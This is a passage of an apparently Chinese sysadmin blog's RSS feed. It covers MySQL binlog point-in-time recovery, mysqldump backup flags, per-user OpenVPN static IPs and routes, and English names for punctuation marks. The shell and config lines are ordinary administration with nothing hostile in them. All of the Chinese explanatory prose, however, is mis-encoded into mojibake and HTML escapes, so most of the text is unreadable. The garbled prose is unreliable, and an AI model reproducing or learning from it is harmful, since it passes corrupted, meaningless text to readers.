&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ç”±äºæˆ‘ä»¬åœ¨å¤‡ä»½ä¸­ä½¿ç”¨äº†å‚æ•°&amp;ndash;flush-logs &amp;ndash;master-data=2ï¼Œæ‰€ä»¥ &lt;strong&gt;åº“å.sql&lt;/strong&gt; ä¸­ä¼šæœ‰binglogçš„ä¿¡æ¯ä¾›æˆ‘ä»¬ä½¿ç”¨ã€‚&lt;/p&gt;
&lt;h4 id=&#34;ä¸€ç”¨mysqlbinlogæ¥æ¢å¤&#34;&gt;ä¸€ã€ç”¨mysqlbinlogæ¥æ¢å¤&lt;/h4&gt;
&lt;p&gt;æˆ‘ä»¬é¦–å…ˆè¦æŸ¥åˆ°éšåçš„binlogæ–‡ä»¶æ˜¯é‚£ä¸ªï¼Œä»é‚£æ—¶å€™èµ·åˆç”Ÿæˆå¤šå°‘ä¸ªbinglogæ–‡ä»¶ã€‚&lt;/p&gt;
&lt;p&gt;ç„¶åå»åº“é‡ŒæŸ¥è¯¢ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;show master logs&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;show master status&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img alt=&#34;image-20221122194020751&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20221122-mysqldump_binlog/image-20221122194020751.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬è¦åˆ†æä¸€ä¸‹SQL&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# show binlog events [IN &amp;#39;log_name&amp;#39;] [FROM pos] [LIMIT [offset,] row_count];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;show binlog events in &lt;span class=&#34;s1&#34;&gt;&amp;#39;javaboy_logbin.000002&amp;#39;&lt;/span&gt; limit 5,10&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æˆ‘ä»¬æ¥ç¿»çœ‹æ—¥å¿—ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20221122194528219&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20221122-mysqldump_binlog/image-20221122194528219.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;å¯ä»¥çœ‹åˆ°æ˜¯ä» 764&amp;ndash;&amp;gt;865 ï¼Œå‘ç”Ÿäº†åˆ é™¤ï¼Œé‚£ä¹ˆå›æ”¾åˆ°è¿™ä¸ª764è¿™ä¸ªpositionå‰å³å¯ï¼Œ764ä¸ä¼šæ‰§è¡Œ&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;mysqlbinlog /var/lib/mysql/mysql-bin.000204 --stop-position=764 --database=bbb | mysql -uroot -p
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&amp;ndash;start-positionæŒ‡å®šä»å“ªé‡Œå¼€å§‹æ¢å¤ï¼Œå¦‚æœä¸æŒ‡å®šï¼Œå°±ä¼šä»binlogæ–‡ä»¶å¼€å¤´çš„positionå¼€å§‹&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mysqlbinlog /var/lib/mysql/mysql-bin.000204 --start-position&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;205&lt;/span&gt; --stop-position&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;764&lt;/span&gt; --database&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;bbb &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; mysql -uroot -p
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;äºŒç”¨binglog2sqlæ¥æ¢å¤&#34;&gt;äºŒã€ç”¨binglog2sqlæ¥æ¢å¤&lt;/h4&gt;
&lt;p&gt;binlog2sql æ˜¯å¤§ä¼—ç‚¹è¯„å…¬å¸çš„DBA å¼€å‘çš„ä¸€æ¬¾åŸºäºé€šè¿‡è§£æbinlogå°†delete æ¢å¤ä¸ºinsert,update çš„å€¼ set å­—æ®µå’Œwhereæ¡ä»¶åšå¯¹è°ƒçš„åŸç†æ¥æ¢å¤æ•°æ®çš„ã€‚ ä½¿ç”¨é™åˆ¶ MySQLçš„binlog format å¿…é¡»æ˜¯row å®‰è£…&lt;/p&gt;</description>
    </item>
    <item>
      <title>MySQLæ•°æ®åº“çš„å¤‡ä»½å’Œæ¢å¤ä¹‹ä¸€</title>
      <link>https://rendoumi.com/posts/20221121-mysqldump/</link>
      <pubDate>Mon, 21 Nov 2022 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20221121-mysqldump/</guid>
      <description>&lt;p&gt;å–œå¤§æ™®å¥”ï¼Œå¹²äº†ä¸€ä¸ªæœˆçš„MySQL DBAçš„å·¥ä½œï¼Œåˆå­¦åˆ°äº†ä¸€éƒ¨åˆ†çŸ¥è¯†ã€‚&lt;/p&gt;
&lt;p&gt;è®°å½•ä¸€ä¸‹ï¼Œä»¥å¤‡ä¸æ—¶åªéœ€&lt;/p&gt;
&lt;p&gt;mysqldump çš„å¤‡ä»½å…¶å®å¾ˆéº»çƒ¦ï¼Œè¦è€ƒè™‘å¾ˆå¤šå› ç´ &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;å¤‡ä»½æ—¶å€™ä¸èƒ½é”è¡¨&lt;/li&gt;
&lt;li&gt;æ¢å¤çš„æ—¶å€™è¦å¿«&lt;/li&gt;
&lt;li&gt;æœ‰äºŒè¿›åˆ¶æ•°æ®çš„è¯éœ€è¦å¤‡ä»½äºŒè¿›åˆ¶æ•°æ®&lt;/li&gt;
&lt;li&gt;æœ‰è§¦å‘å™¨ã€å­˜å‚¨è¿‡ç¨‹çš„éƒ½å¤‡ä»½&lt;/li&gt;
&lt;li&gt;é€šå¸¸ mysqldump æ˜¯åšæ¯å¤©çš„fullbackupï¼Œè¦ä¸ºä¹‹åçš„ binlog åšå¥½å‡†å¤‡ï¼Œä¸‡ä¸€è¦æ¢å¤è¦æå‰åšå¥½å‡†å¤‡&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;æˆ‘ä»¬ä¸€ç‚¹ä¸€ç‚¹æ¥è¯´ï¼š&lt;/p&gt;
&lt;p&gt;ä¸€ã€å¤‡ä»½æ—¶ä¸èƒ½é”è¡¨&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;--single-transaction
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;é€šè¿‡å°†å¯¼å‡ºæ“ä½œå°è£…åœ¨ä¸€ä¸ªäº‹åŠ¡å†…æ¥ä½¿å¾—å¯¼å‡ºçš„æ•°æ®æ˜¯ä¸€ä¸ªä¸€è‡´æ€§å¿«ç…§
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;è¯¥é€‰é¡¹åœ¨å¯¼å‡ºæ•°æ®ä¹‹å‰æäº¤ä¸€ä¸ªBEGIN SQLè¯­å¥ï¼ŒBEGINä¸ä¼šé˜»å¡ä»»ä½•åº”ç”¨ç¨‹åºä¸”èƒ½ä¿è¯å¯¼å‡ºæ—¶æ•°æ®åº“çš„ä¸€è‡´æ€§çŠ¶æ€ã€‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;å®ƒåªé€‚ç”¨äºInnoDBå­˜å‚¨å¼•æ“ã€‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;æœ¬é€‰é¡¹å’Œ--lock-tablesé€‰é¡¹æ˜¯äº’æ–¥çš„ï¼Œå› ä¸ºLOCK TABLESä¼šä½¿ä»»ä½•æŒ‚èµ·çš„äº‹åŠ¡éšå«æäº¤ã€‚
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;äºŒã€æ¢å¤æ—¶è¦å°½é‡å¿«&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;--opt
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ç­‰åŒäº--add-drop-table,  --add-locks, --create-options, --quick, --extended-insert, --lock-tables,  --set-charset, --disable-keys è¯¥é€‰é¡¹é»˜è®¤å¼€å¯,  å¯ä»¥ç”¨--skip-optç¦ç”¨.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;--extended-insert,  -e
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;--extended-insert&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;false&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ä½¿ç”¨å…·æœ‰å¤šä¸ªVALUESåˆ—çš„INSERTè¯­æ³•ã€‚è¿™æ ·ä½¿å¯¼å‡ºæ–‡ä»¶æ›´å°ï¼Œå¹¶åŠ é€Ÿå¯¼å…¥æ—¶çš„é€Ÿåº¦ã€‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;é»˜è®¤ä¸ºæ‰“å¼€çŠ¶æ€ï¼Œä½¿ç”¨--skip-extended-insertå–æ¶ˆé€‰é¡¹ã€‚
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¸‰ã€æœ‰äºŒè¿›åˆ¶çš„æŒ‰äºŒè¿›åˆ¶å¤‡ä»½&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;--hex-blob
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ä½¿ç”¨åå…­è¿›åˆ¶æ ¼å¼å¯¼å‡ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²å­—æ®µã€‚å¦‚æœæœ‰äºŒè¿›åˆ¶æ•°æ®å°±å¿…é¡»ä½¿ç”¨è¯¥é€‰é¡¹ã€‚å½±å“åˆ°çš„å­—æ®µç±»å‹æœ‰BINARYã€VARBINARYã€BLOBã€‚
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å››ã€æœ‰è§¦å‘å™¨ã€å­˜å‚¨è¿‡ç¨‹çš„éƒ½å¤‡ä»½&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;--triggers
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;å¯¼å‡ºè§¦å‘å™¨ã€‚è¯¥é€‰é¡¹é»˜è®¤å¯ç”¨ï¼Œç”¨--skip-triggersç¦ç”¨å®ƒã€‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;--routines, -R
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;å¯¼å‡ºå­˜å‚¨è¿‡ç¨‹ä»¥åŠè‡ªå®šä¹‰å‡½æ•°
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;äº”ã€ä¸ºä¹‹åå¦‚æœè¦åšbinlogæ¢å¤æå‰åšå¥½å‡†å¤‡&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;--flush-logs
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;å¼€å§‹å¯¼å‡ºä¹‹å‰åˆ·æ–°binlogæ—¥å¿—ã€‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;è¯·æ³¨æ„ï¼šå‡å¦‚ä¸€æ¬¡å¯¼å‡ºå¤šä¸ªæ•°æ®åº“&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ä½¿ç”¨é€‰é¡¹--databasesæˆ–è€…--all-databases&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;ï¼Œå°†ä¼šé€ä¸ªæ•°æ®åº“åˆ·æ–°æ—¥å¿—ã€‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;é™¤éä½¿ç”¨--lock-all-tablesæˆ–è€…--master-dataå¤–ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ—¥å¿—å°†ä¼šè¢«åˆ·æ–°ä¸€æ¬¡ï¼Œç›¸åº”çš„æ‰€ä»¥è¡¨åŒæ—¶è¢«é”å®šã€‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;å› æ­¤ï¼Œå¦‚æœæ‰“ç®—åŒæ—¶å¯¼å‡ºå’Œåˆ·æ–°æ—¥å¿—åº”è¯¥ä½¿ç”¨--lock-all-tables æˆ–è€…--master-data å’Œ--flush-logs
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;--master-data
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;åœ¨å¯¼å‡ºçš„æ—¶å€™åŒæ—¶ç”Ÿæˆbinlogæ–‡ä»¶åå’Œä½ç½®åœ¨å¯¼å‡ºçš„æ–‡ä»¶å¼€å¤´ã€‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;è¿™ä¸ªéå¸¸é‡è¦ã€‚binlog çš„æ–‡ä»¶å’Œä½ç½®å¯ä»¥ä»è¿™é‡Œæ‹¿åˆ°ã€‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ä¾‹å¦‚ï¼š
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-- CHANGE MASTER TO &lt;span class=&#34;nv&#34;&gt;MASTER_LOG_FILE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;binlog.000001&amp;#39;&lt;/span&gt;, &lt;span class=&#34;nv&#34;&gt;MASTER_LOG_POS&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;157&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;è¯¥é€‰é¡¹å°†binlogçš„ä½ç½®å’Œæ–‡ä»¶åè¿½åŠ åˆ°è¾“å‡ºæ–‡ä»¶ä¸­ã€‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;å¦‚æœä¸º1ï¼Œå°†ä¼šè¾“å‡ºCHANGE MASTER å‘½ä»¤ï¼›
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;å¦‚æœä¸º2ï¼Œè¾“å‡ºçš„CHANGE  MASTERå‘½ä»¤å‰æ·»åŠ æ³¨é‡Šä¿¡æ¯ã€‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;è¯¥é€‰é¡¹å°†æ‰“å¼€--lock-all-tables é€‰é¡¹ï¼Œé™¤é--single-transactionä¹Ÿè¢«æŒ‡å®šï¼ˆåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå…¨å±€è¯»é”åœ¨å¼€å§‹å¯¼å‡ºæ—¶è·å¾—å¾ˆçŸ­çš„æ—¶é—´ï¼›å…¶ä»–å†…å®¹å‚è€ƒä¸‹é¢çš„--single-transactioné€‰é¡¹ï¼‰ã€‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;è¯¥é€‰é¡¹è‡ªåŠ¨å…³é—­--lock-tablesé€‰é¡¹ã€‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mysqldump  -uroot -p --host&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;localhost --all-databases --master-data&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mysqldump  -uroot -p --host&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;localhost --all-databases --master-data&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;2&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;é‚£ä¹ˆç»¼ä¸Šæ‰€è¿°ï¼Œæ€»ç»“ä¸€è¡Œéå¸¸ä½¿ç”¨çš„å¤‡ä»½è¯­å¥ï¼š&lt;/p&gt;</description>
    </item>
    <item>
      <title>OpenVPNå®¢æˆ·ç«¯å®šåˆ¶IPå’Œè·¯ç”±</title>
      <link>https://rendoumi.com/posts/20221119-openvpn_client/</link>
      <pubDate>Sat, 19 Nov 2022 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20221119-openvpn_client/</guid>
      <description>&lt;p&gt;å…¬å¸ç”¨çš„ OpenVPN ï¼Œç ”å‘éƒ¨é—¨å’Œæ™®é€šå‘˜å·¥çš„æƒé™ä¸ä¸€æ ·ï¼ŒæŠ€æœ¯éƒ¨é—¨éœ€è¦è®¿é—®æœåŠ¡å™¨ï¼Œæ™®é€šå‘˜å·¥åˆ™ä¸éœ€è¦&lt;/p&gt;
&lt;p&gt;è¿™æ ·çš„è¯å°±éœ€è¦æ ¹æ®ç”¨æˆ·å®šåˆ¶è·¯ç”±äº†ï¼ŒæŠ€æœ¯éƒ¨é—¨æ¨é€ç‰¹å®šçš„è·¯ç”±ï¼Œæ™®é€šå‘˜å·¥ä¸æ¨é€ã€‚&lt;/p&gt;
&lt;p&gt;é‚£ä¹ˆåšæ³•å¦‚ä¸‹ï¼Œåœ¨ server.conf åšå¦‚ä¸‹è®¾å®šï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ifconfig-pool-persist /etc/openvpn/conf/ipp.txt
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;client-config-dir /etc/openvpn/conf/static
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç¬¬ä¸€è¡Œæ˜¯æŒ‡å®šè®°å½• ip åœ°å€çš„æ–‡ä»¶ï¼Œä½œç”¨æ˜¯å¦‚æœæœåŠ¡å™¨è¿›ç¨‹é‡å¯äº†ï¼Œé‡å¯åä¼šè¯»å–è¿™ä¸ªæ–‡ä»¶ï¼Œå®¢æˆ·ç«¯é‡æ–°æ‹¨å·åè·å¾—çš„ IP å°±ä¸ä¼šå˜ï¼Œè¿˜æ˜¯é‡å¯å‰çš„ IPã€‚&lt;/p&gt;
&lt;p&gt;ç¬¬äºŒè¡Œæ˜¯æŒ‡å®šäº†å®¢æˆ·ç«¯çš„å•ç‹¬é…ç½®&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬å‡è®¾ä¸€ä¸ªç”¨æˆ·æ˜¯ zhangranruiï¼Œé‚£ä¹ˆå°±å» /etc/openvpn/conf/static ä¸‹å»ºç«‹ä¸€ä¸ª zhangranrui çš„æ–‡æœ¬æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# å‰é¢æ˜¯å®¢æˆ·ç«¯å›ºå®šIPåœ°å€ï¼Œåé¢æ˜¯ç½‘å…³åœ°å€
ifconfig-push 172.18.0.10 172.18.0.9

# æ¨é€è·¯ç”±ï¼Œåé¢æ˜¯æ©ç 
push &amp;#34;route 10.10.0.0 255.255.0.0&amp;#34;

# é‡å®šå‘å®¢æˆ·ç«¯çš„æ‰€æœ‰æµé‡ï¼Œå¦åˆ™è®¿é—®æœåŠ¡ç«¯å†…ç½‘è¦åƒä¸Šé¢ä¸€æ ·æ¨é€è·¯ç”±
# push &amp;#34;redirect-gateway def1&amp;#34;

# æ¨é€ç»™å®¢æˆ·ç«¯çš„DNSè§£æåœ°å€
# push &amp;#34;dhcp-option DNS 223.5.5.5&amp;#34;
# push &amp;#34;dhcp-option DNS 114.114.114.114&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ä¸Šé¢æˆ‘ä»¬å›ºå®šäº†IPï¼Œä¹Ÿæ¨é€äº†ç‰¹å®šè·¯ç”±ï¼Œé‚£ä¹ˆæ€ä¹ˆçŸ¥é“ä¸€ä¸ªå®¢æˆ·çš„ ip å‘¢ï¼Œå»çœ‹ ipp æ–‡ä»¶ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat /etc/openvpn/conf/ipp.txt
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;zhangranrui,172.18.0.8
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ³¨æ„ï¼Œä¸Šé¢æ–‡ä»¶é‡Œçš„ 172.18.0.8 ä¸æ˜¯ ip ï¼Œæ˜¯ &lt;strong&gt;ç½‘æ®µ&lt;/strong&gt; åœ°å€&lt;/p&gt;
&lt;p&gt;172.18.0.9 æ˜¯ç½‘å…³åœ°å€ï¼Œ172.18.0.10æ‰æ˜¯çœŸæ­£çš„ IP åœ°å€ï¼Œæ‰€ä»¥ä¸è¦æé”™äº†&lt;/p&gt;</description>
    </item>
    <item>
      <title>è‹±è¯­çš„ç¬¦å·è¡¨è¾¾</title>
      <link>https://rendoumi.com/posts/20221117-sign/</link>
      <pubDate>Thu, 17 Nov 2022 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20221117-sign/</guid>
      <description>&lt;p&gt;é¢è¯• infosys çš„æ—¶å€™æ˜¯ä¸€ä¸ªå°åº¦è€å“¥åšè€ƒå®˜ï¼Œä»–é—®æˆ‘çš„é—®é¢˜æˆ‘æ˜¯ä¸€å¥éƒ½å¬ä¸æ‡‚çš„ï¼Œç¡®å®æ˜¯å¬ä¸æ‡‚ã€‚&lt;/p&gt;
&lt;p&gt;ç„¶åä»–æŠŠé—®é¢˜åœ¨ webex ä¸­æ‰“å‡ºæ¥æˆ‘å›ç­”çš„ã€‚&lt;/p&gt;
&lt;p&gt;å…¶ä¸­æœ‰ä¸€ä¸ªé—®é¢˜æ˜¯ï¼šå¦‚ä½•ç”¨CLIæŸ¥å‡ºç³»ç»Ÿä¸­å†…å­˜å ç”¨æœ€é«˜çš„5ä¸ªè¿›ç¨‹&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ps aux --sort=-%mem | head -n 5
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ä¸Šé¢ä¸€å¥å¦‚ä½•ç”¨è‹±è¯­è¡¨è¾¾å‡ºæ¥å‘¢ï¼Œä¸å¥½è¯´å•Š&lt;/p&gt;
&lt;p&gt;æ‰€ä»¥è®°å½•ä¸€ä¸‹ï¼Œä»¥å¤‡å°†æ¥ä¸æ—¶ä¹‹éœ€&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-javascripts&#34; data-lang=&#34;javascripts&#34;&gt;ï¼ period å¥å·
ï¼Œ comma é€—å·
ï¼š colon å†’å·
ï¼› semicolon åˆ†å·
ï¼ exclamation æƒŠå¹å·
ï¼Ÿ question é—®å·
-  hyphen è¿å­—ç¬¦
* asterisk æ˜Ÿå·
&amp;#39; apostrophe æ‰€æœ‰æ ¼ç¬¦å·ï¼Œå•è¯å†…éƒ¨çš„çœç•¥
â€” dash ç ´æŠ˜å·
_ underscore
â€˜ â€™ single quotation marks å•å¼•å·
â€œ â€ double quotation marks åŒå¼•å·
( ) round brackets åœ†æ‹¬å·
[ ] square brackets æ–¹æ‹¬å·
&amp;lt;&amp;gt; Angle brackets å°–æ‹¬å·
{} curly brackets or braces å¤§æ‹¬å·
ã€Š ã€‹French quotes æ³•æ–‡å¼•å·ï¼›ä¹¦åå·
... ellipsis çœç•¥å·
Â¨ tandem colon åŒç‚¹å·
&amp;#34; ditto åŒä¸Š
â€– parallel åŒçº¿å·
ï¼ slash æ–œçº¿å·
ï¼† ampersand = and
ï½ tilde æ³¢æµªå·
Â§ section; division åˆ†èŠ‚å·
â†’ arrow ç®­å·ï¼›å‚è§å·
| vertical bar ç«–çº¿
backslash åæ–œçº¿
% percent ç™¾åˆ†å·
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    <item>
      <title>é˜¿é‡Œäº‘IPSecä¸é”æ·è·¯ç”±å™¨å¾—è¿æ¥</title>
      <link>https://rendoumi.com/posts/20221115-ipsec/</link>
      <pubDate>Tue, 15 Nov 2022 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20221115-ipsec/</guid>
      <description>&lt;p&gt;ç°åœ¨ä¹Ÿå¼€å§‹æèµ·æ¡Œé¢è¿ç»´äº†ï¼Œå…¶å®è¿˜æ„Ÿè§‰è›®æœ‰æ„æ€çš„ã€‚&lt;/p&gt;
